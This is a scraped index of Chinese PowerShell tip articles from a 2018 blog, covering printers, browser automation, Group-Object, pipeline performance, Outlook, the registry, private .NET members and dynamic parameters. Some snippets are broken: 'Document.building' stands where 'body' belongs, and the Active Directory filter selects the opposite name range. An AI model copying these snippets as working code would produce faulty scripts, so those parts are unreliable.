Aleksandar SerbiaSnover Jeffrey USASpecial ÄÖÜß Test","link":"/2018/10/04/using-csv-to-create-objects/"},{"title":"PowerShell 技能连载 - 安装打印机","text":"从 Windows 8 和 Server 2012 R2 起，这些操作系统附带发行了一个名为 PrintManagement 的 PowerShell 模块。该模块中的 cmdlet 可以实现脚本化安装和配置打印机。以下是一段帮助您起步的代码： 1234567891011$PrinterName = &quot;MyPrint&quot;$ShareName = &quot;MyShare&quot;$DriverName = 'HP Designjet Z Series PS Class Driver'$portname = &quot;${PrinterName}:&quot;Add-PrinterDriver -Name $DriverNameAdd-PrinterPort -Name $portnameAdd-Printer -Name $PrinterName -DriverName $DriverName -PortName $portname -ShareName $ShareName# requires Admin privileges# Set-Printer -Name $PrinterName -Shared $true 它从驱动库中安装了一个新的打印机。新的打印机默认没有在网络上共享，因为需要管理员权限。作为管理员，您可以运行 Set-Printer 来启用共享，也可以向 Add-Printer 命令添加 -Shared 开关参数。 要探索 PrintManagement 模块中的其它 cmdlet，请使用这行代码： 1PS&gt; Get-Command -Module PrintManagement 请注意 Windows 7 中没有包含该模块，而且无法在 Windows 7 中安装，因为 Windows 7 缺少运行该模块中 cmdlet 的某些依赖项。","link":"/2018/10/05/installing-printers/"},{"title":"PowerShell 技能连载 - 自动化操作网站","text":"有些时候，需要自动化操作某些已经人工打开的网站。也许您需要先用 WEB 表单登录到内部的网页。假设网站是通过 Internet Explorer 加载的（不是 Edge 或任何第三方浏览器），您可以使用 COM 接口来访问浏览器的实时内容。 当您访问动态网页时，纯 HTML 元素可能会更有用。一个纯 WebClient（或是 Invoke-WebRequest cmdlet）只会返回静态 HTML，并不是用户在浏览器中看到的内容。当使用一个真实的浏览器显示网页内容时，您的脚本需要访问驱动显示内容的完整 HTML。 要测试这一点，请打开 Internet Explorer 或者 Edge，并浏览到需要的网站。在我们的例子中，我们导航到 www.powershellmagazine.com。 12345678$obj = New-Object -ComObject Shell.Application$browser = $obj.Windows() | Where-Object FullName -like '*iexplore.exe' | # adjust the below to match your URL Where-Object LocationUrl -like '*powershellmagazine.com*' | # take the first browser that matches in case there are # more than one Select-Object -First 1 在 $browser 中，您可以访问打开的浏览器中的对象模型。如果 $browser 为空，请确保您调整了 LocationUrl 的过滤条件。不要忘了两端的星号。 如果您希望挖掘网页中的所有图片，以下是获取所有图片列表的方法： 1$browser.Document.images | Out-GridView 类似地，如果您希望挖掘网页的内容信息，以下代码返回页面的 HTML： 1PS&gt; $browser.Document.building.innerHTML 您可以使用正则表达式来挖掘内容。不过有一个限制：如果您需要以已登录的 WEB 用户的上下文来进行额外的操作，那么别指望了。例如，如果您需要下载一个需要登录才能获取的文件，那么您需要通过对象模型调用 Internet Explorer 的下载操作。 您可能无法通过 Invoke-WebRequest 或是其它简单的 WEB 客户端来下载文件，因为 PowerShell 运行在它自己的上下文中。而对于网站而言，看到的是一个匿名访问者。 使用 Internet Explorer 对象模型来进行更多高级操作，例如下载文件或视频，并不是完全不可行。但基本上是十分复杂的，您需要向用户界面发送点击和按键动作。","link":"/2018/10/08/automating-live-websites/"},{"title":"PowerShell 技能连载 - 探索 Group-Object","text":"Group-Object 是一个好用的 cmdlet：它可以方便地可视化分组。请查看以下示例： 123Get-Process | Group-Object -Property CompanyGet-Eventlog -LogName System -EntryType Error | Group-Object -Property SourceGet-ChildItem -Path c:\\windows -File | Group-Object -Property Extension Basically, the cmdlet builds groups based on the content of a given property. You can also omit the group, and just look at the count if all that matters to you are the number distributions:基本上，该 cmdlet 基于指定的属性内容创建分组。当您只关注数量分布时，也可以忽略该分组，而只查看总数。 12345678910111213141516PS C:\\&gt; Get-ChildItem -Path c:\\windows -File | Group-Object -Property Extension -NoElement | Sort-Object -Property Count -DescendingCount Name----- ---- 10 .exe 10 .log 5 .ini 4 .xml 3 .dll 2 .txt 1 .dat 1 .bin 1 .tmp 1 .prx 如果您对实际对象的分组更感兴趣，可以通过 Group-Object 来返回一个哈希表。通过这种方式，您可以通过他们的键访问每个特定的分组： 1234$hash = Get-ChildItem -Path c:\\windows -File | Group-Object -Property Extension -AsHashTable$hash.'.exe' 执行的结果将转储 Windows 目录下所有扩展名为 “.exe” 的文件。请注意键（查询的属性）不为字符串的情况。 类似地，如果您使用 PowerShell 远程操作并且扇出到多台计算机来平行地获取信息，当获取到结果时，Group-Object 将会把结果重新分组。这个示例同时从三台机器获取服务信息，而且结果将以随机顺序返回。Group-Object 将会对输入的数据分组，这样您可以操作计算机的结果。和哈希表的操作方法一样，您可以用方括号或点号来存取哈希表的键： 1234$services = Invoke-Command -ScriptBlock { Get-Service } -ComputerName server1, server2, server3 | Group-Object -Property PSComputerName -AsHashTable$services[&quot;server1&quot;]$services.&quot;server2&quot; 以下是一个类似的示例，但有一个 bug。您能指出错误吗？ 1234$hash = Get-Service | Group-Object -Property Status -AsHashTable$hash.'Running' 当您查看哈希表时，您可能希望获取正在运行的服务： 123456PS C:\\&gt; $hashName Value---- -----Running {AdobeARMservice, AGMService, AGSService, App...Stopped {AJRouter, ALG, AppIDSvc, AppMgmt...} When you look at the hash table, you would expect to get back the running services:然而，您并不会获得任何结果。那是因为哈希表中的那个键并不是字符串而是一个 “ServiceControllerStatus” 对象： 1234PS C:\\&gt; $hash.Keys | Get-Member TypeName: System.ServiceProcess.ServiceControllerStatus 要确保获得到的是可存取的键，请总是将 -AsHashTable 和 -AsString 合并使用。后者确保把键转换为字符串。现在示例代码可以按预期工作： 1234$hash = Get-Service | Group-Object -Property Status -AsHashTable -AsString$hash.'Running'","link":"/2018/10/09/discover-group-object/"},{"title":"PowerShell 技能连载 - 改进 Group-Object","text":"在每一个技能中我们解释了 Group-Object 能为您做什么，以及它有多么好用。不幸的是，Group-Object 的性能不理想。如果您试图对大量对象分组，该 cmdlet 可能会消耗大量时间。 以下是一行按文件大小对您的用户文件夹中所有文件排序的代码。当您希望检测重复的文件时，这将是一个十分重要的先决条件。由于这行代码将在最终返回结果，所以将会消耗大量的时间，甚至数小时： 123456$start = Get-Date$result = Get-ChildItem -Path $home -Recurse -ErrorAction SilentlyContinue -File | Group-Object -Property Length$stop = Get-Date($stop - $start).TotalSeconds 由于这些限制，我们创建了一个基于 PowerShell 的 Group-Object 的实现，并称它为 Group-ObjectFast。它基本上做相同的事请，只是速度更快。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115function Group-ObjectFast{ param ( [Parameter(Mandatory,Position=0)] [Object] $Property, [Parameter(ParameterSetName='HashTable')] [Alias('AHT')] [switch] $AsHashTable, [Parameter(ValueFromPipeline)] [psobject[]] $InputObject, [switch] $NoElement, [Parameter(ParameterSetName='HashTable')] [switch] $AsString, [switch] $CaseSensitive ) begin { # if comparison needs to be case-sensitive, use a # case-sensitive hash table, if ($CaseSensitive) { $hash = [System.Collections.Hashtable]::new() } # else, use a default case-insensitive hash table else { $hash = @{} } } process { foreach ($element in $InputObject) { # take the key from the property that was requested # via -Property # if the user submitted a script block, evaluate it if ($Property -is [ScriptBlock]) { $key = &amp; $Property } else { $key = $element.$Property } # convert the key into a string if requested if ($AsString) { $key = &quot;$key&quot; } # make sure NULL values turn into empty string keys # because NULL keys are illegal if ($key -eq $null) { $key = '' } # if there was already an element with this key previously, # add this element to the collection if ($hash.ContainsKey($key)) { $null = $hash[$key].Add($element) } # if this was the first occurrence, add a key to the hash table # and store the object inside an arraylist so that objects # with the same key can be added later else { $hash[$key] = [System.Collections.ArrayList]@($element) } } } end { # default output are objects with properties # Count, Name, Group if ($AsHashTable -eq $false) { foreach ($key in $hash.Keys) { $content = [Ordered]@{ Count = $hash[$key].Count Name = $key } # include the group only if it was requested if ($NoElement -eq $false) { $content[&quot;Group&quot;] = $hash[$key] } # return the custom object [PSCustomObject]$content } } else { # if a hash table was requested, return the hash table as-is $hash } }} 只需要将上述例子中的 Group-Object 替换为 Group-ObjectFast，就可以体验它的速度： 123456$start = Get-Date$result = Get-ChildItem -Path $home -Recurse -ErrorAction SilentlyContinue -File | Group-ObjectFast -Property Length$stop = Get-Date($stop - $start).TotalSeconds 在我们的测试中，Group-ObjectFast 比 Group-Object 快了大约 10 倍。","link":"/2018/10/10/improving-group-object/"},{"title":"PowerShell 技能连载 - Adding New Incrementing Number Column in a Grid View Window","text":"Maybe you’d like to add a column with incrementing indices to your objects. Try this: $startcount = 0 Get-Service | Select-Object -Property @{N='ID#';E={$script:startcount++;$startcount}}, * | Out-GridView When you run this chunk of code, you get a list of services in a grid view window, and the first column “ID#” is added with incrementing ID numbers. The technique can be used to add arbitrary columns. Simply use a hash table with key N[ame] for the column name, and key E[xpression] with the script block that generates the column content.","link":"/2018/10/11/adding-new-incrementing-number-column-in-a-grid-view-window/"},{"title":"PowerShell 技能连载 - Getting AD Users with Selected First Letters","text":"How would you query for all AD users with names that start with a “e”-“g”? You shouldn’t use a client-side filter such as Where-Object. One thing you can do is use the -Filter parameter with logical operators such as -and and -or: Get-ADUser -filter {(name -lt 'E') -or (name -gt 'G')} | Select-Object -ExpandProperty Name this example requires the free RSAT tools from Microsoft to be installed)","link":"/2018/10/12/getting-ad-users-with-selected-first-letters/"},{"title":"PowerShell 技能连载 - Retrieving Outlook Calendar Entries","text":"If you use Outlook to organize your calendar events, here is a useful PowerShell function that connects to Outlook and dumps your calendar entries: Function Get-OutlookCalendar { # load the required .NET types Add-Type -AssemblyName 'Microsoft.Office.Interop.Outlook' # access Outlook object model $outlook = New-Object -ComObject outlook.application # connect to the appropriate location $namespace = $outlook.GetNameSpace('MAPI') $Calendar = [Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderCalendar $folder = $namespace.getDefaultFolder($Calendar) # get calendar items $folder.items | Select-Object -Property Start, Categories, Subject, IsRecurring, Organizer } Try this: PS&gt; Get-OutlookCalendar | Out-GridView","link":"/2018/10/15/retrieving-outlook-calendar-entries/"},{"title":"PowerShell 技能连载 - 持续监视脚本的运行","text":"以下是一段演示如何在 Windows 注册表中存储私人信息的代码： 1234567891011121314151617181920212223242526272829303132333435363738# store settings here$Path = &quot;HKCU:\\software\\powertips\\settings&quot;# check whether key exists$exists = Test-Path -Path $Pathif ($exists -eq $false){ # if this is first run, initialize registry key $null = New-Item -Path $Path -Force}# read existing value$currentValue = Get-ItemProperty -Path $path$lastRun = $currentValue.LastRunif ($lastRun -eq $null){ [PSCustomObject]@{ FirstRun = $true LastRun = $null Interval = $null }}else{ $lastRunDate = Get-Date -Date $lastRun $today = Get-Date $timeSpan = $today - $lastRunDate [PSCustomObject]@{ FirstRun = $true LastRun = $lastRunDate Interval = $timeSpan }}# write current date and time to registry$date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'$null = New-ItemProperty -Path $Path -Name LastRun -PropertyType String -Value $date -Force 当运行这段代码时，它将返回一个对象，该对象告诉您上次运行此脚本是什么时候，以及从那以后运行了多长时间。","link":"/2018/10/16/keeping-track-of-script-execution/"},{"title":"PowerShell 技能连载 - 性能（第 1 部分）：从 6 分钟到 2 秒钟","text":"以下是一个在许多 PowerShell 脚本中常见的错误： 1234567891011$start = Get-Date$bucket = @()1..100000 | ForEach-Object { $bucket += &quot;I am adding $_&quot;}$bucket.Count(Get-Date) - $start 在这个设计中，脚本使用了一个空的数组，然后用某种循环向数组中增加元素。当运行它的时候，会发现它停不下来。实际上这段代码在我们的测试系统中需要超过 6 分钟时间，甚至有可能在您的电脑上要消耗更多时间。 以下是导致缓慢的元凶：对数组使用操作符 “+=“ 是有问题的。因为每次使用 “+=“ 时，它表面上动态扩展了该数组，实际上却是创建了一个元素数量更多一个的新数组。 要显著地提升性能，请让 PowerShell 来创建数组：当返回多个元素时，PowerShell 自动高速创建数组： 123456789$start = Get-Date$bucket = 1..10000 | ForEach-Object { &quot;I am adding $_&quot;}$bucket.Count(Get-Date) - $start 结果完全相同，但和消耗 6+ 分钟不同的是，它在 PowerShell 5.1 上只用了 46 秒钟，而在 PowerShell 6.1 上仅仅用了 1.46 秒。我们将会用另一个技巧来进一步提升性能。","link":"/2018/10/17/performance-part-1-from-6-min-to-2-sec/"},{"title":"PowerShell 技能连载 - 性能（第 2 部分）：从 2 秒到 200 毫秒","text":"在前一个技能中我们对一种常见的脚本模式提升了它的性能。现在，我们用一个更不常见的技巧进一步挤出更多性能。以下是我们上次的进展： 123456789$start = Get-Date$bucket = 1..100000 | ForEach-Object { &quot;I am adding $_&quot;}$bucket.Count(Get-Date) - $start 我们已经将执行时间从 6+ 分钟降到在 PowerShell 5.1 中 46 秒，在 PowerShell 6.1 中 1.46 秒。 现在我们看一看这个小改动——它返回完全相同的结果： 123456789$start = Get-Date$bucket = 1..100000 | &amp; { process { &quot;I am adding $_&quot;} }$bucket.Count(Get-Date) - $start 这段神奇的代码在 PowerShell 5.1 中只花了 0.2 秒，在 PowerShell 6.1 中只花了 0.5 秒。 如您所见，这段代码只是将 ForEach-Object cmdlet 替换为等价的 $ { process { $_ }}。结果发现，由于 cmdlet 绑定的高级函数，管道操作符的执行效率被严重地拖慢了。如果使用一个简单的函数（或是一个纯脚本块），就可以显著地加速执行速度。结合昨天的技能，我们已经设法将处理从 6+ 分钟提速到 200 毫秒，而得到完全相同的结果。 请注意一件事情：这些优化技术只适用于大量迭代的循环。如果您的循环只迭代几百次，那么感受不到显著的区别。然而，一个循环迭代越多次，错误的设计就会导致越严重的消耗。","link":"/2018/10/18/performance-part-2-from-2-sec-to-200ms/"},{"title":"PowerShell 技能连载 - 性能（第 3 部分）：更快的管道函数","text":"在之前的技能中我们演示了如何改进循环，尤其是管道操作。要将这个知识点转为函数，请看一下这个简单的管道相关的函数，它的功能是统计管道传送过来的元素数量： 12345678910111213141516171819202122232425function Count-Stuff{ param ( # pipeline-aware input parameter [Parameter(ValueFromPipeline)] $InputElement ) begin { # initialize counter $c = 0 } process { # increment counter for each incoming object $c++ } end { # output sum $c }} 当您运行这个函数来统计一个非常大数量的对象时，可能会得到这样的结果： 123456789PS&gt; $start = Get-Date1..1000000 | Count-Stuff(Get-Date) - $start1000000...TotalMilliseconds : 3895,5848... 现在我们去掉属性，将这个函数转换为一个“简单函数” 123456789101112131415161718function Count-Stuff{ begin { # initialize counter $c = 0 } process { # increment counter for each incoming object $c++ } end { # output sum $c }} 由于没有定义管道参数，从管道的输入在 process 块中保存在 “$_“ 变量中以及在 end 块中，一个名为 “$input“ 的迭代器保存了所有收到的数据。请注意我们的计数示例并不需要这些变量，因为它只是统计了输入的数量。 以下是执行结果： 123456789$start = Get-Date1..1000000 | Count-Stuff(Get-Date) - $start1000000...TotalMilliseconds : 690,1558... 显然，处理大量对象的时候，简单函数比管道函数的性能要高得多。 当然，仅当用管道传输大量对象的时候效果比较明显。但当做更多复杂操作的时候，效果会更加明显。例如，以下代码创建 5 位的服务器列表，用高级函数的时候，它在我们的测试系统上大约消耗 10 秒钟： 1234567891011121314151617181920function Get-Servername{ param ( # pipeline-aware input parameter [Parameter(ValueFromPipeline)] $InputElement ) process { &quot;Server{0:n5}&quot; -f $InputElement }}$start = Get-Date$list = 1..1000000 | Get-ServerName(Get-Date) - $start 使用简单函数可以在 2 秒之内得到相同的结果（在 PowerShell 5.1 和 6.1 相同）： 12345678910111213function Get-ServerName{ process { &quot;Server{0:n5}&quot; -f $InputElement }}$start = Get-Date$list = 1..1000000 | Get-ServerName(Get-Date) - $start","link":"/2018/10/19/performance-part-3-faster-pipeline-functions/"},{"title":"PowerShell 技能连载 - 存取隐藏（私有）成员","text":"对象和类型中包括方法和属性等成员，但只有少数是公开可见和可使用的。还有许多隐藏（私有）的成员。在生产系统上使用这些成员是不明智的，当它们更新版本的时候，您并不会得到通知，所以可能会工作不正常。所以对于高级的 PowerShell 开发者来说是一个很好奇的地方。 有一个免费的 PowerShell 模块名为 ImpliedReflection，能将私有的成员变为可见，甚至在 PowerShell ISE 和 Visual Studio Code 的 IntelliSense 中，而且您可以运行那些成员。 例如，以下公有的类型只暴露了一个公有的方法，您可以用它来构造 PowerShell 的模块路径。 1234567891011121314151617181920PS&gt; [System.Management.Automation.ModuleIntrinsics]::GetModulePathOverloadDefinitions-------------------static string GetModulePath(string currentProcessModulePath, string hklmMachineModulePath, stringhkcuUserModulePath)PS&gt; [System.Management.Automation.ModuleIntrinsics] | Get-Member -Static TypeName: System.Management.Automation.ModuleIntrinsicsName MemberType Definition---- ---------- ----------Equals Method static bool Equals(System.Object objA, System.Object objB)GetModulePath Method static string GetModulePath(string currentProcessModulePath, string hklmMa...ReferenceEquals Method static bool ReferenceEquals(System.Object objA, System.Object objB) 现在我们像这样安装 ImpliedReflection： 1Install-Module -Name ImpliedReflection -Scope CurrentUser 当该模块安装以后，您需要先允许该扩展： 1PS&gt; Enable-ImpliedReflection -Force 现在，当您重新访问该类型并查看它的成员时，仍然只显示其公有成员。只有当您交互式输出该类型时，该扩展才起作用： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556PS&gt; [System.Management.Automation.ModuleIntrinsics] | Get-Member -Static TypeName: System.Management.Automation.ModuleIntrinsicsName MemberType Definition---- ---------- ----------Equals Method static bool Equals(System.Object objA, System.Object objB)GetModulePath Method static string GetModulePath(string currentProcessModulePath, string hklmMa...ReferenceEquals Method static bool ReferenceEquals(System.Object objA, System.Object objB)PS&gt; [System.Management.Automation.ModuleIntrinsics]IsPublic IsSerial Name BaseType-------- -------- ---- --------True False ModuleIntrinsics System.ObjectPS&gt; [System.Management.Automation.ModuleIntrinsics] | Get-Member -Static TypeName: System.Management.Automation.ModuleIntrinsicsName MemberType Definition---- ---------- ----------AddToPath Method static string AddToPath(string basePath, string pathToAdd, ...CombineSystemModulePaths Method static string CombineSystemModulePaths()Equals Method static bool Equals(System.Object objA, System.Object objB)ExportModuleMembers Method static void ExportModuleMembers(System.Management.Automatio...GetDscModulePath Method static string GetDscModulePath()GetExpandedEnvironmentVariable Method static string GetExpandedEnvironmentVariable(string name, S...GetManifestGuid Method static guid GetManifestGuid(string manifestPath)GetManifestModuleVersion Method static version GetManifestModuleVersion(string manifestPath)GetModuleName Method static string GetModuleName(string path)GetModulePath Method static string GetModulePath(string currentProcessModulePath...GetPersonalModulePath Method static string GetPersonalModulePath()GetSystemwideModulePath Method static string GetSystemwideModulePath()IsModuleMatchingModuleSpec Method static bool IsModuleMatchingModuleSpec(psmoduleinfo moduleI...IsPowerShellModuleExtension Method static bool IsPowerShellModuleExtension(string extension)NewAliasInfo Method static System.Management.Automation.AliasInfo NewAliasInfo(...PathContainsSubstring Method static int PathContainsSubstring(string pathToScan, string ...PatternContainsWildcard Method static bool PatternContainsWildcard(System.Collections.Gene...ProcessOneModulePath Method static string ProcessOneModulePath(System.Management.Automa...ReferenceEquals Method static bool ReferenceEquals(System.Object objA, System.Obje...RemoveNestedModuleFunctions Method static void RemoveNestedModuleFunctions(psmoduleinfo module)SetModulePath Method static string SetModulePath()SortAndRemoveDuplicates Method static void SortAndRemoveDuplicates[T](System.Collections.G..._ctor Method static System.Management.Automation.ModuleIntrinsics _ctor(...MaxModuleNestingDepth Property static int MaxModuleNestingDepth {get;}PSModuleExtensions Property static string[] PSModuleExtensions {get;set;}PSModuleProcessableExtensions Property static string[] PSModuleProcessableExtensions {get;set;}SystemWideModulePath Property static string SystemWideModulePath {get;set;}Tracer Property static System.Management.Automation.PSTraceSource Tracer {g... 现在您可以使用私有的成员了，好像它们是公有的一样： 12345PS&gt; [System.Management.Automation.ModuleIntrinsics]::GetPersonalModulePath()C:\\Users\\tobwe\\Documents\\WindowsPowerShell\\ModulesPS&gt; [System.Management.Automation.ModuleIntrinsics]::SystemWideModulePathc:\\windows\\system32\\windowspowershell\\v1.0\\Modules 再次强调，这仅仅适用于希望更深入了解对象和类型内部的工作机制的高级用户。ImpliedReflection 模块用于操作私有成员。在生产环境下，您需要十分谨慎地操作私有成员。","link":"/2018/10/22/accessing-hidden-private-member/"},{"title":"PowerShell 技能连载 - 编程检查对象属性","text":"当您用 Import-Csv 将一个 CSV 列表导入 PowerShell，或用任何其它类型的对象来处理时：如何自动确定对象的属性？以下是一个简单的方法： 12345# take any object, and dump a list of its propertiesGet-Process -Id $pid | Get-Member -MemberType *property | Select-Object -ExpandProperty Name | Sort-Object 为什么这种方法有用？有许多使用场景。例如，您可以检测一个注册表键的名称，支持用通配符转储所有的命令： 1234567891011121314151617181920$RegPath = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;# get actual registry values from path$Values = Get-ItemProperty -Path $RegPath# exclude default properties$default = 'PSChildName','PSDrive','PSParentPath','PSPath','PSProvider'# each value surfaces as object property# get property (value) names$keyNames = $Values | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | Where-Object { $_ -notin $default } | Sort-Object# dump autostart programs$keyNames | ForEach-Object { $values.$_}","link":"/2018/10/23/examining-object-properties-programmatically/"},{"title":"PowerShell 技能连载 - 编程列出所有 Cmdlet 或函数参数的列表","text":"是否曾好奇如何列出一个函数或 cmdlet 暴露出的所有属性？以下是实现方法： 1Get-Help Get-Service -Parameter * | Select-Object -ExpandProperty name Get-Help 提供了一系列关于参数的有用的信息和元数据。如果您只希望转储支持管道输入的参数，以下是实现方法： 123Get-Help Get-Service -Parameter * |Where-Object { $_.pipelineInput.Length -gt 10 } |Select-Object -Property name, pipelineinput, parameterValue “pipelineInput“ 属性暴露了通过管道接收到的一个属性的类型。不幸的是，它包含了一个本地化的字符串，所以一个区分的好方法是取字符串的长度。 输出的结果类似这样，并且可以从管道上游的命令中接受管道的输入，以及接受数据类型： 12345name pipelineInput parameterValue---- ------------- --------------ComputerName True (ByPropertyName) String[]InputObject True (ByValue) ServiceController[]Name True (ByPropertyName, ByValue) String[]","link":"/2018/10/24/programmatically-listing-any-cmdlet-or-function-parameters/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 调用 Excel 宏","text":"PowerShell 可以调用 Microsoft Excel 工作表，并执行其中的宏。由于这只对可见的 Excel 程序窗口有效，所以当您尝试进行安全敏感操作，例如宏时，最好保持 Excel 打开（参见以下代码）来查看警告信息： 123456789# file path to your XLA file with macros$FilePath = &quot;c:\\test\\file.xla&quot;# macro name to run$Macro = &quot;AddData&quot;$excel = New-Object -ComObject Excel.Application$excel.Visible = $true$wb = $excel.Workbooks.Add($FilePath)$excel.Run($Macro)","link":"/2018/10/25/invoking-excel-macros-from-powershell/"},{"title":"PowerShell 技能连载 - 将 VBScript 翻译为 PowerShell","text":"大多数旧的 VBS 脚本可以容易地翻译为 PowerShell。VBS 中关键的命令是 “CreateObject“。它能让您操作系统的库。PowerShell 将 “CreateObject“ 翻译为 “New-Object -ComObject“，而对象模型和成员名称保持相同： 当把这段代码保存为扩展名为 “.vbs” 的文本文件后，这段 VBS 脚本就可以发出语音： 123Set obj = CreateObject(&quot;Sapi.SpVoice&quot;)obj.Speak &quot;Hello World!&quot; 对应的 PowerShell 代码类似这样： 12$obj = New-Object -ComObject &quot;Sapi.SpVoice&quot;$obj.Speak(&quot;Hello World!&quot;) 只有少量的 VBS 内置成员，例如 MsgBox 或 InputBox。要翻译这些代码，您需要引入 “Microsoft.VisualBasic.Interaction“ 类型。以下是调用 MsgBox 或 InputBox 的 PowerShell 代码： 123456Add-Type -AssemblyName Microsoft.VisualBasic$result = [Microsoft.VisualBasic.Interaction]::MsgBox(&quot;Do you want to restart?&quot;, 3, &quot;Question&quot;)$result$result = [Microsoft.VisualBasic.Interaction]::InputBox(&quot;Your name?&quot;, $env:username, &quot;Enter Name&quot;) 以下是支持的 Visual Basic 成员的完整列表： 12345678910111213141516171819202122232425262728293031PS&gt; [Microsoft.VisualBasic.Interaction] | Get-Member -Stati TypeName: Microsoft.VisualBasic.InteractionName MemberType Definition---- ---------- ----------AppActivate Method static void AppActivate(int ProcessId), static vo...Beep Method static void Beep()CallByName Method static System.Object CallByName(System.Object Obj...Choose Method static System.Object Choose(double Index, Params ...Command Method static string Command()CreateObject Method static System.Object CreateObject(string ProgId, ...DeleteSetting Method static void DeleteSetting(string AppName, string ...Environ Method static string Environ(int Expression), static str...Equals Method static bool Equals(System.Object objA, System.Obj...GetAllSettings Method static string[,] GetAllSettings(string AppName, s...GetObject Method static System.Object GetObject(string PathName, s...GetSetting Method static string GetSetting(string AppName, string S...IIf Method static System.Object IIf(bool Expression, System....InputBox Method static string InputBox(string Prompt, string Titl...MsgBox Method static Microsoft.VisualBasic.MsgBoxResult MsgBox(...Partition Method static string Partition(long Number, long Start, ...ReferenceEquals Method static bool ReferenceEquals(System.Object objA, S...SaveSetting Method static void SaveSetting(string AppName, string Se...Shell Method static int Shell(string PathName, Microsoft.Visua...Switch Method static System.Object Switch(Params System.Object[...PS&gt;","link":"/2018/10/26/translating-vbscript-to-powershell/"},{"title":"PowerShell 技能连载 - 接受不同的参数类型","text":"个别情况下，您可能会希望创建一个可以接受不同参数类型的函数。假设您希望用户既可以传入一个雇员姓名，也可以传入一个 Active Directory 对象。 在 PowerShell 中有一个固定的原则：变量不能在同一时刻有不同的数据类型。由于参数是变量，所以一个指定的参数只能有一个唯一的类型。 然而，您可以使用参数集来定义互斥的参数，这是一种解决多个输入类型的好方法。以下是一个既可以输入服务名，也可以输入服务对象的示例函数。这基本上是 Get-Service 内部的工作原理，以下示例展示了它的实现方式： 1234567891011121314151617181920212223242526272829303132333435function Get-MyService{ [CmdletBinding(DefaultParameterSetName=&quot;String&quot;)] param ( [String] [Parameter(Mandatory,Position=0,ValueFromPipeline,ParameterSetName='String')] $Name, [Parameter(Mandatory,Position=0,ValueFromPipeline,ParameterSetName='Object')] [System.ServiceProcess.ServiceController] $Service ) process { # if the user entered a string, get the real object if ($PSCmdlet.ParameterSetName -eq 'String') { $Service = Get-Service -Name $Name } else { # else, if the user entered (piped) the expected object in the first place, # you are good to go } # this call tells you which parameter set was invoked $PSCmdlet.ParameterSetName # at the end, you have an object $Service }} 我们看看该函数的使用： 1234567891011121314151617181920212223242526272829303132333435PS&gt; Get-MyService -Name spoolerStringStatus Name DisplayName------ ---- -----------Running spooler Print SpoolerPS&gt; $spooler = Get-Service -Name SpoolerPS&gt; Get-MyService -Service $spoolerObjectStatus Name DisplayName------ ---- -----------Running Spooler Print SpoolerPS&gt; &quot;Spooler&quot; | Get-MyServiceStringStatus Name DisplayName------ ---- -----------Running Spooler Print SpoolerPS&gt; $spooler | Get-MyServiceObjectStatus Name DisplayName------ ---- -----------Running Spooler Print Spooler 如您所见，用户可以传入一个服务名或是 Service 对象。Get-MyService 函数模仿 Get-Service 内部的实现机制，并且返回一个 Service 对象，无论输入什么类型。以下是上述函数的语法： 123**Syntax** Get-MyService [-Name] &lt;string&gt; [&lt;CommonParameters&gt;] Get-MyService [-Service] &lt;ServiceController&gt; [&lt;CommonParameters&gt;]","link":"/2018/10/29/accepting-different-parameter-types/"},{"title":"PowerShell 技能连载 - 读取网站内容","text":"通常情况下，通过 PowerShell 的 Invoke-WebRequest 命令来获取原始的 HTML 网站内容是很常见的情况。脚本可以处理 HTML 内容并对它做任意操作，例如用正则表达式从中提取信息： 123$url = &quot;www.tagesschau.de&quot;$w = Invoke-WebRequest -Uri $url -UseBasicParsing$w.Content 然而，有些时候一个网站的内容是通过客户端脚本代码动态创建的。那么，Invoke-WebRequest` 并不能返回浏览器中所见的完整 HTML 内容。如果仍要获取 HTML 信息，您需要借助一个真实的 WEB 浏览器。一个简单的方法是使用内置的 Internet Explorer： 12345678$ie = New-Object -ComObject InternetExplorer.Application$ie.Navigate($url)do{ Start-Sleep -Milliseconds 200} while ($ie.ReadyState -ne 4)$ie.Document.building.innerHTML","link":"/2018/10/30/accessing-website-content/"},{"title":"PowerShell 技能连载 - 使用动态参数","text":"大多数 PowerShell 函数使用静态参数。它们是定义在 param() 代码块中的，并且始终存在。一个不太为人所知的情况是您也可以快速地编程添加动态参数。动态参数的最大优势是您可以完全控制它们什么时候可以出现，以及它们可以接受什么类型的数值。它的缺点是需要使用大量底层的代码来“编程”参数属性。 以下是一个示例函数。它只有一个名为 “Company“ 的静态参数。仅当您选择了一个公司，该函数才会添加一个名为 “Department“ 的新的动态参数。新的动态参数 -Department 根据选择的公司暴露出一个可用值的列表。实质上，根据选择的公司，-Department 参数被关联到一个独立的 ValidateSet 属性： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function Test-Department{ [CmdletBinding()] param ( [Parameter(Mandatory=$true)] [ValidateSet('Microsoft','Amazon','Google','Facebook')] $Company ) dynamicparam { # this hash table defines the departments available in each company $data = @{ Microsoft = 'CEO', 'Marketing', 'Delivery' Google = 'Marketing', 'Delivery' Amazon = 'CEO', 'IT', 'Carpool' Facebook = 'CEO', 'Facility', 'Carpool' } # check to see whether the user already chose a company if ($Company) { # yes, so create a new dynamic parameter $paramDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary $attributeCollection = New-Object -TypeName System.Collections.ObjectModel.Collection[System.Attribute] # define the parameter attribute $attribute = New-Object System.Management.Automation.ParameterAttribute $attribute.Mandatory = $false $attributeCollection.Add($attribute) # create the appropriate ValidateSet attribute, listing the legal values for # this dynamic parameter $attribute = New-Object System.Management.Automation.ValidateSetAttribute($data.$Company) $attributeCollection.Add($attribute) # compose the dynamic -Department parameter $Name = 'Department' $dynParam = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter($Name, [string], $attributeCollection) $paramDictionary.Add($Name, $dynParam) # return the collection of dynamic parameters $paramDictionary } } end { # take the dynamic parameters from $PSBoundParameters $Department = $PSBoundParameters.Department &quot;Chosen department for $Company : $Department&quot; }} 请注意！当您在选择的编辑器中键入 Test-Department，初始情况下只有一个参数：Tbc-Company。当您选择了四个可用得公司之一，第二个参数 -Department 